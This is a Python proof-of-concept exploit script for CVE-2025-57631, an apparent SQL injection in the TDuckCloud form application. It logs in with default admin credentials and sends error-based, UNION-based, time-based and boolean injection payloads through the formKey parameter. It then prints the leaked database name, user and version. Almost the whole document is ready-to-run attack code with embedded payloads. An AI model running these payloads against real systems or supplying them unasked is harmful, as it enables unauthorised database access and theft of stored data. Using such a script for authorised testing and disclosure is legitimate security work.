#!/usr/bin/env python3
import requests
import sys
import time
import argparse

class TDuckSQLInjection:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.token = None
        
    def login(self, username, password):
        url = f"{self.target_url}/login/account"
        data = {"account": username, "password": password}
        try:
            resp = self.session.post(url, json=data, timeout=10)
            result = resp.json()
            if result.get('code') == 200 and result.get('data'):
                self.token = result['data']['token']
                return True
            return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False
    
    def get_headers(self):
        return {"token": self.token, "Content-Type": "application/json"}
    
    def check_sqli_time_based(self, form_key, sleep_time=5):
        """
        SQL injection via formKey parameter in searchAll method
        Vulnerable code in FormDataMysqlService.java:
        select * from fm_user_form_data where form_key = '{formKey}'
        """
        url = f"{self.target_url}/user/form/data/download/file"
        
        payload = f"' AND SLEEP({sleep_time})-- -"
        malicious_formkey = f"{form_key}{payload}"
        
        data = {"formKey": malicious_formkey}
        
        print(f"[*] Testing time-based SQL injection...")
        print(f"[*] Payload: {malicious_formkey}")
        
        try:
            start_time = time.time()
            resp = self.session.post(url, json=data, headers=self.get_headers(), timeout=sleep_time + 10)
            elapsed = time.time() - start_time
            
            if elapsed >= sleep_time:
                print(f"[+] SQL Injection confirmed! Response delayed by {elapsed:.2f} seconds")
                return True
            else:
                print(f"[-] Response time: {elapsed:.2f} seconds (expected >= {sleep_time})")
                return False
        except requests.exceptions.Timeout:
            print(f"[+] SQL Injection confirmed! Request timed out (expected for SLEEP payload)")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def check_sqli_error_based(self, form_key):
        """
        Error-based SQL injection test
        """
        url = f"{self.target_url}/user/form/data/download/file"
        
        payload = "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
        malicious_formkey = f"{form_key}{payload}"
        
        data = {"formKey": malicious_formkey}
        
        print(f"[*] Testing error-based SQL injection...")
        
        try:
            resp = self.session.post(url, json=data, headers=self.get_headers(), timeout=10)
            if "Duplicate entry" in resp.text or "tduck" in resp.text.lower():
                print(f"[+] Error-based SQL Injection confirmed!")
                print(f"[*] Response: {resp.text[:500]}")
                return True
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def check_sqli_union(self, form_key):
        """
        UNION-based SQL injection to extract data
        fm_user_form_data has 17 columns
        """
        url = f"{self.target_url}/user/form/data/download/file"
        
        payload = "' UNION SELECT 1,database(),user(),version(),5,6,7,8,9,10,11,12,13,NOW(),15,NOW(),17-- -"
        malicious_formkey = f"{form_key}{payload}"
        
        data = {"formKey": malicious_formkey}
        
        print(f"[*] Testing UNION-based SQL injection...")
        
        try:
            resp = self.session.post(url, json=data, headers=self.get_headers(), timeout=10)
            result = resp.json()
            msg = result.get('msg', '')
            
            if 'different number of columns' in msg:
                sql_match = msg.split("SQL: ")[1].split("###")[0] if "SQL: " in msg else ""
                print(f"[+] SQL Injection CONFIRMED!")
                print(f"[+] Injected SQL: {sql_match.strip()}")
                return True
            elif 'Cannot determine value type from string' in msg:
                import re
                match = re.search(r"from string '([^']+)'", msg)
                if match:
                    leaked_data = match.group(1)
                    print(f"[+] SQL Injection CONFIRMED!")
                    print(f"[+] Leaked database user: {leaked_data}")
                return True
            elif result.get('code') == 200:
                print(f"[+] UNION SQL Injection CONFIRMED! Data retrieved successfully")
            print(f"[*] Response: {result}")
            return True
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def extract_database_info(self, form_key):
        """
        Extract database information using SQL injection
        """
        url = f"{self.target_url}/user/form/data/query"
        
        payload = "' OR '1'='1"
        malicious_formkey = f"{form_key}{payload}"
        
        data = {"formKey": malicious_formkey, "current": 0, "size": 10}
        
        print(f"[*] Attempting to extract data...")
        
        try:
            resp = self.session.post(url, json=data, headers=self.get_headers(), timeout=10)
            result = resp.json()
            if result.get('code') == 200:
                print(f"[+] Data extraction attempt:")
                print(f"[*] Response: {result}")
                return True
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-57631 TDuckCloud SQL Injection PoC')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://localhost:8999)')
    parser.add_argument('--username', default='admin@tduckcloud.com', help='Login username')
    parser.add_argument('--password', default='123456', help='Login password')
    parser.add_argument('--formkey', help='Existing form key to test')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-57631 - TDuckCloud SQL Injection PoC")
    print("Vulnerability: SQL Injection in file upload module")
    print("=" * 60)
    
    poc = TDuckSQLInjection(args.url)
    
    print(f"\n[*] Target: {args.url}")
    print(f"[*] Logging in as {args.username}...")
    
    if not poc.login(args.username, args.password):
        print("[-] Login failed!")
        sys.exit(1)
    
    print("[+] Login successful!")
    
    form_key = args.formkey if args.formkey else "test"
    
    print(f"\n[*] Testing SQL Injection with formKey: {form_key}")
    
    poc.check_sqli_error_based(form_key)
    poc.check_sqli_union(form_key)
    poc.check_sqli_time_based(form_key, 3)
    poc.extract_database_info(form_key)
    
    print("\n" + "=" * 60)
    print("PoC completed")
    print("=" * 60)

if __name__ == "__main__":
    main()
